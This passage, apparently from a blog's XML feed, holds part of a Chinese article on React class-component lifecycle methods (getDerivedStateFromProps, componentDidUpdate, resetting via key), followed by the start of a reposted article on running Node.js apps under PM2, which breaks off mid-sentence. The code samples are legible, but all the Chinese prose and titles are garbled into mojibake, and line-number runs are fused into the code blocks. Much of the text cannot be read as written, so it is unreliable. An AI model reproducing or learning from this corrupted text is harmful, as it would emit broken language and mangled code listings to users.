&lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 88, age: this.props.age &#125;; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; componentDidUpdate() &#123; if (this.props.age !== this.state.age) &#123; console.log(&quot;componentDidUpdate&quot;, this.props.age); this.setState(&#123; age: this.props.age &#125;); &#125; &#125; render() &#123; const &#123; onChangeParent &#125; = this.props; console.log(&quot;render&quot;, this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); ä½¿ç”¨ key çš„å†™æ³• é€šè¿‡æ”¹å˜ key ï¼Œæ¥é‡æ–°åˆå§‹åŒ–ç»„ä»¶ åœ¨çº¿ demo è¿™å¬èµ·æ¥å¾ˆæ…¢ï¼Œä½†æ˜¯è¿™ç‚¹çš„æ€§èƒ½æ˜¯å¯ä»¥å¿½ç•¥çš„ã€‚å¦‚æœåœ¨ç»„ä»¶æ ‘çš„æ›´æ–°ä¸Šæœ‰å¾ˆé‡çš„é€»è¾‘ï¼Œè¿™æ ·åè€Œä¼šæ›´å¿«ï¼Œå› ä¸ºçœç•¥äº†å­ç»„ä»¶çš„ diff React å®˜æ–¹å»ºè®®çš„æ¨¡å¼ æˆ‘è§‰å¾—è¿™ç§å†™æ³•ï¼Œéå¸¸é€‚åˆï¼šå½“ä½ è°ƒç”¨åŒäº‹å†™çš„ä¸šåŠ¡ UI ç»„ä»¶æ—¶ï¼Œå¦‚æœä»–æ²¡æœ‰è€ƒè™‘åˆ°ç»„ä»¶å†…éƒ¨çŠ¶æ€éœ€è¦è·Ÿéšå¤–éƒ¨ props çš„æ›´æ”¹çš„æƒ…å†µï¼ˆæ¨ä¸å¾—ä¸Šå»å°±ç»™ä»–ä¸ªè†ç›–é‡é”¤ ğŸ˜‚ğŸ˜‚ğŸ˜‚ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ key æ¥å¿«é€Ÿå®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class ExampleComponent extends React.Component &#123; state = &#123; id: &apos;123456&apos;, &#125;; render()&#123; const &#123;id&#125; = this.state; // å½“ id å˜åŒ–æ—¶ï¼Œkey ä¹Ÿéšä¹‹æ”¹å˜ï¼Œé‚£ä¹ˆç»„ä»¶å°±ä¼šé‡æ–°åˆå§‹åŒ– return &lt;ExampleComponent key=&#123;id&#125; id=&#123;id&#125;/&gt;; &#125;&#125;class ExampleComponent extends React.Component &#123; state = &#123; externalData: null, &#125;; // ä¸éœ€è¦ä½¿ç”¨ getDerivedStateFromProps æˆ–è€… componentWillReceiveProps // static getDerivedStateFromProps(nextProps, prevState) &#123; // if (nextProps.id !== prevState.prevId) &#123; // return &#123; // externalData: null, // prevId: nextProps.id, // &#125;; // &#125; // return null; // &#125; componentDidMount() &#123; this._loadAsyncData(this.props.id); &#125; componentWillUnmount() &#123; if (this._asyncRequest) &#123; this._asyncRequest.cancel(); &#125; &#125; render() &#123; if (this.state.externalData === null) &#123; // Render loading state ... &#125; else &#123; // Render real UI ... &#125; &#125; _loadAsyncData(id) &#123; this._asyncRequest = asyncLoadData(id).then( externalData =&gt; &#123; this._asyncRequest = null; this.setState(&#123;externalData&#125;); &#125; ); &#125;&#125; getDerivedStateFromProps æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè€Œç»„ä»¶å®ä¾‹æ— æ³•ç»§æ‰¿é™æ€æ–¹æ³•ï¼Œæ‰€ä»¥è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­å†…éƒ¨æ— æ³•é€šè¿‡ä½¿ç”¨ this è·å–ç»„ä»¶å®ä¾‹çš„å±æ€§/æ–¹æ³•ã€‚ æœ‰äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å¯¹çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤/ç­›é€‰ç­‰æ“ä½œï¼Œè€Œè¿™äº›æ“ä½œä¸€èˆ¬éƒ½ä¼šæ”¾åœ¨ä¸€ä¸ªå•ç‹¬çš„å‡½æ•°ä¸­ï¼ˆå•ä¸€åŸåˆ™ï¼‰ï¼Œç„¶åå°†è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­è·å–åˆ°çš„propsä¼ é€’è¿›è¿™äº›æ–¹æ³•ä¸­è¿›è¡Œå¤„ç†ã€‚ å¦‚æœé€‰æ‹©æŠŠè¿™äº›æ–¹æ³•æ”¾åœ¨ class ç»„ä»¶ä¸Šï¼Œé‚£ä¹ˆè¿™äº›æ–¹æ³•å¾—ç”³æ˜æˆé™æ€æ–¹æ³•ï¼Œç„¶ååœ¨è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­ä¸­é€šè¿‡ className.xxx è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚ 1234567891011121314151617181920212223class AAA extends React.Component &#123; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.id !== prevState.prevId) &#123; const data = AAA.filterFn(nextProps.data); return &#123; data, prevId: nextProps.id, &#125;; &#125; return null; &#125; static filterFn(data)&#123; // è¿‡æ»¤æ•°æ® ... return newData; &#125; ...&#125; æˆ–è€…æŠŠè¿™äº›æ–¹æ³•æ”¾åœ¨ class ç»„ä»¶å¤–é¢ï¼Œå°±ä¸ç”¨ç”³æ˜æˆé™æ€æ–¹æ³•ï¼Œåœ¨è¯¥ç”Ÿå‘½å‘¨æœŸé’©å­ä¸­ç›´æ¥è°ƒç”¨è¿™äº›æ–¹æ³•ã€‚ 12345678910111213141516171819202122function filterFn(data)&#123; // è¿‡æ»¤æ•°æ® ... return newData;&#125;class AAA extends React.Component &#123; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.id !== prevState.prevId) &#123; const data = filterFn(nextProps.data); return &#123; data, prevId: nextProps.id, &#125;; &#125; return null; &#125; ...&#125; åœ¨ä½¿ç”¨ä»¥ä¸Šä¸¤ç§æ–¹æ³•æ—¶ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºçš„ä¸€ä¸ªç¼ºç‚¹ï¼šå¦‚æœè¿™äº›æ–¹æ³•æ¯”è¾ƒå¤æ‚ï¼Œå†…éƒ¨è¿˜è°ƒç”¨äº†åˆ«çš„å‡½æ•°ï¼Œæ­¤æ—¶ï¼Œè¦ä¹ˆæ‰€æœ‰çš„å¤„ç†å‡½æ•°éƒ½ç”³æ˜æˆé™æ€æ–¹æ³•ï¼Œè¦ä¹ˆæ‰€æœ‰çš„æ–¹æ³•éƒ½æåˆ°ç»„ä»¶å¤–éƒ¨å»ï¼Œå¹¶ä¸”éœ€è¦ä¸€å±‚å±‚çš„å¾€ä¸‹ä¼ é€’ props å€¼ã€‚æ— æ³•åƒç»„ä»¶å®ä¾‹çš„æ–¹æ³•ä¸€æ ·ï¼Œå¯ä»¥åœ¨æ¯ä¸ªç»„ä»¶å®ä¾‹æ–¹æ³•å†…ï¼Œé€šè¿‡ this.props.xxx / this.state.xxx è®¿é—®å±æ€§ï¼Œä¼šæ¯”è¾ƒéº»çƒ¦ã€‚ è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼š ç»“åˆ componentDidUpdate ä½¿ç”¨ åœ¨çº¿ demo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 66 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 88 &#125;; static getDerivedStateFromProps(nextprops, state) &#123; console.log(&quot;getDerivedStateFromProps&quot;, nextprops); if (nextprops.age !== state.age) &#123; return &#123; // ç»™ä¸€ä¸ªæ ‡è¯† status: false, // age: nextprops.age, onChangeParent: nextprops.onChangeParent &#125;; &#125; return null; &#125; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; processData()&#123; console.log(&quot;process&quot;,this.props); return this.props.age; &#125; componentDidUpdate() &#123; // æ ¹æ®æ ‡è¯†æ¥æ›´æ–°çŠ¶æ€ if (!this.state.status) &#123; this.setState(&#123; age: this.processData(), status: true &#125;); console.log(&quot;componentDidUpdate&quot;); &#125; &#125; componentDidMount() &#123; this.setState(&#123; age: this.props.age, status: true &#125;); &#125; render() &#123; const &#123; onChangeParent &#125; = this.state; console.log(&quot;render&quot;, this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); ä½¿ç”¨ getDerivedStateFromProps æ´¾ç”ŸçŠ¶æ€æ—¶ï¼Œä¸éœ€è¦æŠŠç»„ä»¶è‡ªèº«çš„çŠ¶æ€ä¹Ÿè®¾ç½®è¿›å»12345678910111213141516171819class AAA extends React.Component &#123; // å¿…é¡»ç»™ state è®¾ç½®ä¸€ä¸ªå€¼ï¼Œå“ªæ€•æ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ state = &#123; num:666 &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.id !== prevState.prevId) &#123; return &#123; data:nextProps.data, prevId: nextProps.id, // åªéœ€è¦æ˜ å°„å±æ€§ï¼Œä¸éœ€è¦æŠŠç»„ä»¶è‡ªèº«çš„çŠ¶æ€ä¹ŸåŠ è¿›å» // num:prevState.num &#125;; &#125; return null; &#125; ...&#125; å¦‚æœ setState æ›´æ–°çš„å€¼ä¸å˜ï¼Œé‚£ä¹ˆè¿˜ä¼šè§¦å‘è¿™äº›ç”Ÿå‘½å‘¨æœŸé’©å­å—ï¼Ÿ å“ªæ€•æ¯æ¬¡éƒ½è®¾ç½®åŒæ ·çš„å€¼ï¼Œè¿˜æ˜¯ä¼šè§¦å‘æ›´æ–° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import React, &#123;Component&#125; from &apos;react&apos;export default class LifeCycle extends Component &#123; static defaultProps = &#123; name: &apos;è®¡æ•°å™¨&apos; &#125;; constructor(props) &#123; super(props); this.state = &#123;number: 0&#125;;//åˆå§‹åŒ–é»˜è®¤çš„çŠ¶æ€å¯¹è±¡ console.log(&apos;1. constructor åˆå§‹åŒ– props and state&apos;); &#125; componentWillMount() &#123; console.log(&apos;2. componentWillMount ç»„ä»¶å°†è¦æŒ‚è½½&apos;); &#125; componentDidMount() &#123; console.log(&apos;4. componentDidMount ç»„ä»¶æŒ‚è½½å®Œæˆ&apos;); &#125; shouldComponentUpdate(nextProps, nextState) &#123; console.log(&apos;Counter&apos;, nextProps, nextState); console.log(&apos;5. shouldComponentUpdate è¯¢é—®ç»„ä»¶æ˜¯å¦éœ€è¦æ›´æ–°&apos;); return true; &#125; componentWillUpdate() &#123; console.log(&apos;6. componentWillUpdate ç»„ä»¶å°†è¦æ›´æ–°&apos;); &#125; componentDidUpdate() &#123; console.log(&apos;7. componentDidUpdate ç»„ä»¶æ›´æ–°å®Œæ¯•&apos;); &#125; add = () =&gt; &#123; this.setState(&#123;number: this.state.number &#125;); &#125;; render() &#123; console.log(&apos;3.renderæ¸²æŸ“&apos;) return ( &lt;div style=&#123;&#123;border: &apos;5px solid red&apos;, padding: &apos;5px&apos;&#125;&#125;&gt; &lt;p&gt;&#123;this.state.number&#125;&lt;/p&gt; &lt;button onClick=&#123;this.add&#125;&gt;+&lt;/button&gt; &lt;/div&gt; ) &#125;&#125; ä¸è¦åœ¨ componentWillMount ä¸­æ·»åŠ äº‹ä»¶ç›‘å¬ åœ¨ componentDidMount ä¸­æ·»åŠ äº‹ä»¶ç›‘å¬ componentWillMount å¯ä»¥è¢«æ‰“æ–­æˆ–è°ƒç”¨å¤šæ¬¡ï¼Œå› æ­¤æ— æ³•ä¿è¯äº‹ä»¶ç›‘å¬èƒ½åœ¨ unmount çš„æ—¶å€™è¢«æˆåŠŸå¸è½½ï¼Œå¯èƒ½ä¼šå¼•èµ·å†…å­˜æ³„éœ² ç”±äº React æœªæ¥çš„ç‰ˆæœ¬ä¸­æ¨å‡ºäº†å¼‚æ­¥æ¸²æŸ“ï¼Œåœ¨ dom è¢«æŒ‚è½½ä¹‹å‰çš„é˜¶æ®µéƒ½å¯ä»¥è¢«æ‰“æ–­é‡æ¥ï¼Œå¯¼è‡´ componentWillMountã€componentWillUpdateã€componentWillReceiveProps åœ¨ä¸€æ¬¡æ›´æ–°ä¸­å¯èƒ½ä¼šè¢«è§¦å‘å¤šæ¬¡ï¼Œå› æ­¤é‚£äº›åªå¸Œæœ›è§¦å‘ä¸€æ¬¡çš„å‰¯ä½œç”¨åº”è¯¥æ”¾åœ¨ componentDidUpdate ä¸­ è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦æŠŠå¼‚æ­¥è¯·æ±‚æ”¾åœ¨ componentDidMount ä¸­ï¼Œè€Œä¸æ˜¯æ”¾åœ¨ componentWillMount ä¸­çš„åŸå› ï¼Œä¸ºäº†å‘åå…¼å®¹ æœ€å¸¸è§çš„è¯¯è§£å°±æ˜¯ getDerivedStateFromProps å’Œ componentWillReceiveProps åªä¼šåœ¨ props â€œæ”¹å˜â€æ—¶æ‰ä¼šè°ƒç”¨ã€‚å®é™…ä¸Šåªè¦çˆ¶ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œè¿™ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°å°±ä¼šé‡æ–°è°ƒç”¨ï¼Œä¸ç®¡ props æœ‰æ²¡æœ‰â€œå˜åŒ–â€]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åœ¨ç”Ÿäº§ç¯å¢ƒè¿è¡Œ PM2 & Node.js]]></title>
    <url>%2F2020%2F01%2F31%2FNode.js%2F%E5%9C%A8%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E8%BF%90%E8%A1%8C%20PM2%20%26%20Node.js%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5e1c475af265da3e30770143 ç»´æŠ¤ä½ çš„ä»£ç åº“å¹¶ä¿æŒå…¶ç›¸å…³æ€§ç¡®æœ‰éš¾åº¦ï¼›ä½†ä¸ä¹‹ç›¸æ¯”æˆ‘ä»¬ä¼šå‘ç°ï¼Œç»´æŠ¤ä¸€ä¸ªåº”ç”¨æ—¶æœ€å¤§çš„æŒ‘æˆ˜æ¥è‡ªäºä¿æŒå…¶å­˜æ´»å’Œè¿è¡Œã€‚ä¸ä»…å¦‚æ­¤ï¼Œéšç€ Node.js å˜æˆå¤§éƒ¨åˆ†åç«¯ API çš„æ ¸å¿ƒè¯­è¨€ï¼Œå•çº¿ç¨‹ç¨‹åºçš„ä¼¸ç¼©ä¹Ÿå˜å¾—å›°éš¾ï¼›è¿™å°±æ˜¯ PM2 å‡ºç°å¹¶å—åˆ°æ¬¢è¿çš„åŸå› äº†ã€‚ æœ‰å¾ˆå¤šè¿›ç¨‹ç®¡ç†å·¥å…·ï¼Œå¹¿ä¸ºäººçŸ¥çš„å¦‚ Foreverã€strong-pmï¼Œæˆ–æ˜¯ä¸é”™çš„ Linux ç³»ç»Ÿå·¥å…· SystemDã€‚è¿˜æœ‰å°±æ˜¯æœ¬æ–‡çš„ä¸»è§’ PM2ï¼Œæœ‰ç€ 4100 å¤šä¸‡çš„æ€»ä¸‹è½½é‡å’Œ 31k GitHub starsï¼ˆè¯‘æ³¨ï¼šæˆªæ­¢æœ¬æ–‡ç¿»è¯‘æ—¶ï¼‰ã€‚ç©¶å…¶åŸå› ï¼Œç®€å•åœ°è¯´ï¼Œå°±æ˜¯å…¶ç®€å•æ˜“ç”¨å¹¶ä¸”è®©ç®¡ç†ä¸€ä¸ªç”Ÿäº§ç¯å¢ƒå˜å¾—å¤©è¡£æ— ç¼ã€‚ ä½•ä¸º PM2ï¼Ÿ æ­£å¦‚å…¶æ–°ç‰ˆé¦–é¡µä¸­æ‰€æ ‡æ¦œçš„ï¼ŒPM2 æ˜¯ä¸€ä¸ªâ€œèº«ç»ç™¾æˆ˜ï¼ˆbattle hardenedï¼‰â€çš„ã€é€‚ç”¨äºç”Ÿäº§ç¯å¢ƒçš„ Node.js åº”ç”¨è¿è¡Œæ—¶å’Œè¿›ç¨‹ç®¡ç†å·¥å…·ã€‚ ä¹Ÿè‡ªå¸¦äº†å†…å»ºçš„ è´Ÿè½½å‡è¡¡å™¨ï¼Œè¿™ä½¿å¾—æ‰©å±•åº”ç”¨æ„ˆåŠ å®¹æ˜“ã€‚æœ€æ£’çš„æ˜¯ï¼Œå®ƒåœ¨ Linuxã€Windows å’Œ macOS éƒ½èƒ½å·¥ä½œã€‚ é€šè¿‡ä¸€ä¸ª process.json é…ç½®æ–‡ä»¶ï¼ˆè¯‘æ³¨ï¼šè¯¥æ–‡ä»¶å¯è‡ªè¡Œå‘½åï¼Œä¸€èˆ¬å«åš process.jsonã€processes.json æˆ– ecosystem.jsonï¼Œè¯¥åç§°å°†ä½œä¸ºå‚æ•°ä¼ å…¥ pm2 start ç­‰å‘½ä»¤ä¸­ï¼‰ï¼Œä½ å¯ä»¥æŒ‡å®šæƒ³è¦è¿è¡Œçš„è¿›ç¨‹åŠè¦æ‰©å±•åˆ°å¤šå°‘ä¸ªè¿›ç¨‹ã€‚å½“å¯åŠ¨ PM2 æ—¶ï¼Œå®ƒå°†æ ¹æ®ä»¥ä¸Šé…ç½®æ–‡ä»¶å¤„ç†å…¶ä»–æ‰€æœ‰çš„äº‹æƒ…ï¼ˆç”šè‡³æ¯”é…ç½®æ–‡ä»¶æŒ‡å®šçš„æ›´å¤šä¸€äº› ğŸ˜‰ï¼‰ã€‚ æ‰€æœ‰è¿™äº›æ„å‘³ç€ PM2 èƒ½å¸®åŠ©ä½ ä¿æŒ Node.js åº”ç”¨æ°¸è¿œè¿è¡Œä¸‹å»ï¼Œå¹¶åœ¨ä½ æ›´æ–°åº”ç”¨æˆ–æœåŠ¡å™¨æ—¶ä»¥ 0 æ•…éšœåœæœºæ—¶é—´è‡ªåŠ¨é‡å¯ã€‚ å®‰è£… PM2å®‰è£… PM2 å°±æ˜¯å°èœä¸€ç¢Ÿã€‚é¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»é…ç½®å¥½äº† process.json æ–‡ä»¶ï¼Œç”¨ä»¥å¯åŠ¨è¿›ç¨‹ã€‚ ä¸€èˆ¬åªéœ€è¿è¡Œ yarn add global pm2 å³å¯å®‰è£…ã€‚å¦‚æœä½¿ç”¨äº†ä¸€ä¸ª Docker å®¹å™¨ï¼ˆå¯¹ï¼Œä¹Ÿæ”¯æŒ Dockerï¼‰ï¼ŒæŒ‰ç…§ pm2.keymetrics.io/docs/usage/â€¦ ä¸­çš„è¯´æ˜å®‰è£…ã€‚ å¦‚æœä½ å®åœ¨å¥½å¥‡å®ƒçœ‹èµ·æ¥é•¿ä»€ä¹ˆæ ·ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª process_prod.json æ–‡ä»¶çš„ä¾‹å­ï¼Œç”¨äºä¸€ä¸ªå¼€æºçš„ RSS &amp; æ’­å®¢ åº”ç”¨ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243// process_prod.json&#123; &quot;apps&quot;: [&#123; &quot;name&quot;: &quot;api&quot;, &quot;cwd&quot;: &quot;api/dist&quot;, &quot;script&quot;: &quot;server.js&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;conductor&quot;, &quot;cwd&quot;: &quot;api/dist/workers&quot;, &quot;script&quot;: &quot;conductor.js&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;rss-worker&quot;, &quot;cwd&quot;: &quot;api/dist/workers&quot;, &quot;script&quot;: &quot;rss.js&quot;, &quot;instances&quot;: 2, &quot;exec_mode&quot;: &quot;cluster&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;podcast-worker&quot;, &quot;cwd&quot;: &quot;api/dist/workers&quot;, &quot;script&quot;: &quot;podcast.js&quot;, &quot;instances&quot;: 2, &quot;exec_mode&quot;: &quot;cluster&quot;, &quot;watch&quot;: false &#125;, &#123; &quot;name&quot;: &quot;og-worker&quot;, // åº”ç”¨åç§° &quot;cwd&quot;: &quot;api/dist/workers&quot;, // å¯åŠ¨åº”ç”¨çš„ç›®å½• &quot;script&quot;: &quot;og.js&quot;, // å¯åŠ¨è„šæœ¬ &quot;instances&quot;: 2, // è¢«å¯åŠ¨çš„åº”ç”¨å®ä¾‹æ•°é‡ &quot;exec_mode&quot;: &quot;cluster&quot;, // å¯åŠ¨æ¨¡å¼ï¼Œé»˜è®¤ä¸º fork &quot;watch&quot;: false, // å¦‚æœå…è®¸ watchï¼Œåˆ™å…¶ä¸­çš„æ–‡ä»¶æ”¹å˜ä¼šå¼•å‘é‡å¯ &quot;max_memory_restart&quot;: &quot;150M&quot; // å¼•å‘é‡å¯çš„æœ€å¤§å†…å­˜ä½¿ç”¨é‡ &#125; ]&#125;å¤åˆ¶ä»£ç  å¦‚ä½ æ‰€è§ï¼Œæˆ‘ä»¬è¿è¡Œäº†è‹¥å¹²ä¸ªè¿›ç¨‹ï¼Œå¹¶ä¸” PM2 è½»æ¾æŒæ§äº†ä¸€åˆ‡ï¼›å…¶è‡ªåŠ¨åœ°ä½¿ç”¨äº† Node.js çš„ Cluster API ä»¥å®ç°å¤šè¿›ç¨‹ã€‚ è¯‘æ³¨ï¼šé…ç½®æ–‡ä»¶çš„å®Œæ•´ä»‹ç»è§ pm2.keymetrics.io/docs/usage/â€¦ æŠ€å·§ &amp; ç»éªŒå¯¹äºä»»ä½•åº”ç”¨ï¼ˆæˆ–è€…æœ¬ä¾‹ä¸­çš„è¿›ç¨‹ç®¡ç†å·¥å…·ï¼‰ï¼Œä»å…ˆè¡Œè€…é‚£é‡Œäº†è§£ä¸€äº›æŠ€å·§å’Œç»éªŒéƒ½æ˜¯æœ‰å¥½å¤„çš„ã€‚ è‡ªåŠ¨é‡å¯![img](data:image/svg+xml;utf8,) ä¸€æ—¦ PM2 å¯åŠ¨ï¼Œä½ çš„åº”ç”¨å°±å°†æ°¸è¿œå­˜æ´»ï¼Œå¹¶åœ¨åº”ç”¨å´©æºƒå’Œæœºå™¨é‡æ–°å¯åŠ¨åè‡ªåŠ¨é‡å¯ â€“ æ‰€æœ‰è¿™äº›åªæ¶ˆä¸€æ¡ç®€å•çš„å‘½ä»¤ï¼ˆç”¨äºè·å¾—é’ˆå¯¹æ‰€åœ¨æœºå™¨çš„è‡ªåŠ¨é…ç½®è¿‡çš„å¯åŠ¨è„šæœ¬ï¼‰ï¼š 12pm2 startup å¤åˆ¶ä»£ç  å¦‚ï¼š 1234$ pm2 startup[PM2] You have to run this command as root. Execute the following command: sudo su -c &quot;env PATH=$PATH:/home/unitech/.nvm/versions/node/v4.3/bin pm2 startup &lt;distribution&gt; -u &lt;user&gt; --hp &lt;home-path&gt;å¤åˆ¶ä»£ç  åªè¦æŒ‰ç…§æ‰“å°çš„ç»“æœï¼Œæ‹·è´å¹¶è¿è¡Œå¾—åˆ°çš„è„šæœ¬å°±è¡Œäº†ã€‚ è¿›ç¨‹ç®¡ç†![img](data:image/svg+xml;utf8,) ä¸ç®¡ä½ è¿è¡Œäº†å¤šå°‘ä¸ªåº”ç”¨ï¼ŒPM2 çš„ä¸€å¥—å‘½ä»¤éƒ½èƒ½è®©ä½ ç®¡ç†å®ƒä»¬å„è‡ªçš„çŠ¶æ€ã€‚ä»¥ä¸‹æ˜¯å¸¸ç”¨çš„ä¸€äº›å‘½ä»¤ï¼ˆä¸åŒºåˆ†é¡ºåºï¼‰ï¼š pm2 start process_prod.json â€” é€šè¿‡è¿›ç¨‹é…ç½®æ–‡ä»¶å¯åŠ¨è¿›ç¨‹ pm2 ls â€” åˆ—å‡ºæ‰€æœ‰çš„åº”ç”¨ pm2 stop â€” åœæ­¢æŒ‡å®šçš„åº”ç”¨ pm2 start â€” å¯åŠ¨æŒ‡å®šçš„åº”ç”¨ pm2 scale N â€” ç¼©æ”¾æŒ‡å®šåº”ç”¨çš„å®ä¾‹æ•°é‡ pm2 kill â€” æ€æ‰æ‰€æœ‰è¿è¡Œä¸­çš„åº”ç”¨ pm2 restart â€” é‡å¯æ‰€æœ‰è¿è¡Œä¸­çš„åº”ç”¨ pm2 reload â€” é‡æ–°åŠ è½½åº”ç”¨é…ç½®ï¼ˆè¿™ä¼šåœ¨ä½ ä¿®æ”¹äº†åº”ç”¨çš„ç¯å¢ƒå˜é‡æ—¶æ´¾ä¸Šç”¨åœºï¼‰ è¿›ç¨‹ç›‘æ§![img](data:image/svg+xml;utf8,) è¿è¡Œå‘½ä»¤ pm2 monit ä¼šè¿”å›å…³äºåº”ç”¨å¥åº·çš„ä¸°å¯Œæ•°æ®ã€‚æ¯”å¦‚ï¼Œä½ å°†çœ‹åˆ° CPU åˆ©ç”¨ç‡ã€å†…å­˜ä½¿ç”¨é‡ã€è¯·æ±‚åˆ†é’Ÿæ•°ç­‰ç­‰ã€‚ æ—¥å¿—ç®¡ç†![img](data:image/svg+xml;utf8,) PM2 å†…å»ºäº†æ—¥å¿—ç®¡ç†åŠŸèƒ½ã€‚å®ƒä»æ‰€æœ‰ä½ çš„åº”ç”¨ä¸­èšåˆæ—¥å¿—æ•°æ®ï¼Œå¹¶å°†å…¶å†™å…¥ä¸€ä¸ªç”¨äºé˜…è¯»çš„æºæ–‡ä»¶ä¸­ã€‚ä½ ç”šè‡³å¯ä»¥é€šè¿‡äº‹å®è·Ÿè¸ªæ—¥å¿—æ¥çœ‹åˆ°åº”ç”¨èƒŒåæ­£åœ¨å‘ç”Ÿä»€ä¹ˆã€‚ PM2 çš„æ—¥å¿—ç®¡ç†ä¹Ÿæä¾›äº†æ—¥å¿—å¾ªç¯ï¼Œè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼Œç‰¹åˆ«æ˜¯å½“åº”ç”¨ç¨‹åºé¢‘ç¹åœ°è¾“å‡ºè¯¦ç»†æ—¥å¿—æ—¶ã€‚ æœ‰ä¸‰æ¡æˆ‘ç»å¸¸ä½¿ç”¨çš„å‘½ä»¤ï¼Œæƒ³å¿…ä½ ä¹Ÿåº”è¯¥ä¸€æ ·ï¼š pm2 logs â€” ä»æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„åº”ç”¨ä¸­è¾“å‡ºæ—¥å¿— pm2 logs â€” åªä»æŒ‡å®šçš„åº”ç”¨ä¸­è¾“å‡ºæ—¥å¿— pm2 flush â€” åˆ·æ–°æ‰€æœ‰æ—¥å¿—æ•°æ®ï¼Œé‡Šæ”¾ç£ç›˜ç©ºé—´ è¯·è®°ä½ï¼Œç¡®ä¿æ—¥å¿—å¾ªç¯æ˜¯æœ€é‡è¦çš„äº‹æƒ…ã€‚è¿™æ ·åšå°†ä¼šæŠŠä¸€ä¸ªå·¨å¤§çš„æ—¥å¿—æ–‡ä»¶åˆ†å‰²æˆè‹¥å¹²æ˜“äº PM2 ç®¡ç†çš„å°æ–‡ä»¶ã€‚è¦åšåˆ°è¿™ç‚¹ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 12pm2 install pm2\-logrotateå¤åˆ¶ä»£ç  æ—¥å¿—ç®¡ç†çš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨ pm2.keymetrics.io/docs/usage/â€¦ æ‰¾åˆ°ã€‚ å¦‚æœå‘ç°ä½ çš„å®ä¾‹ç»å¸¸è¢«æ—¥å¿—å¡«æ»¡ï¼Œä¹Ÿå¯ä»¥è€ƒè™‘ä½¿ç”¨ä¸€ä¸ªé›†ä¸­å¼æ—¥å¿—æœåŠ¡ï¼Œå¦‚ Logglyã€Papertrailï¼Œæˆ– ELKã€‚ æœ€ä½³å®è·µé€šå¸¸ï¼Œæˆ‘ä¼šä¹äºéµå®ˆ â€œåº”ç”¨åäºŒå› ç´ â€ï¼ˆ12factor.net/ï¼‰æ‰€è¿°çš„å®è·µã€‚è¿™å°†å¸®åŠ©â€¦ PM2 æ‰€æœ‰çš„ä¼˜åŠ¿ã€‚å¦‚æœä½ å·²ç»é˜…è¯»è¿‡å…¶å£°æ˜ï¼Œåº”è¯¥è§åˆ°äº†è¿™ 12 æ¡è§„åˆ™ï¼š ä¸€ä¸ªç½®äºç‰ˆæœ¬æ§åˆ¶ä¸‹çš„ä»£ç åº“, å¤šä»½éƒ¨ç½² æ˜ç¡®åœ°å£°æ˜ï¼Œå¹¶éš”ç¦»ä¾èµ– åœ¨ç¯å¢ƒè€Œéä»£ç ä¸­å­˜å‚¨é…ç½® å°†åç«¯æœåŠ¡è§†ä¸ºé™„åŠ èµ„æº ä¸¥æ 